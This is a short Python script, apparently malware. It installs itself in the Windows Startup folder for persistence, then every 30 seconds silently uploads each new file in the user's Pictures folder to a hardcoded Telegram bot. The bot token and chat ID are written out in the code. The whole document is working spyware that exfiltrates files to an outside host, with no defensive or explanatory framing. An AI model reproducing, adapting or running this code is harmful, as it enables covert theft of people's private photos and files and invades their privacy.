import os
import time
import requests
import shutil
import sys

bot_token = '7265160306:AAHCKfNwmrls0ae0v8Wk7ICCA14cdcVRSKI'
chat_id = '5873834049'

def add_to_startup():
    filename = sys.argv[0]
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    destination = os.path.join(startup_folder, os.path.basename(filename))
    if not os.path.exists(destination):
        shutil.copyfile(filename, destination)

def send_new_files(folder_path):
    sent_files = set()
    while True:
        for file_name in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file_name)
            if file_name not in sent_files and os.path.isfile(file_path):
                try:
                    files = {'document': open(file_path, 'rb')}
                    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument?chat_id={chat_id}', files=files)
                    sent_files.add(file_name)
                except:
                    pass
        time.sleep(30)

target_folder = os.path.expanduser('~/Pictures')

add_to_startup()
send_new_files(target_folder)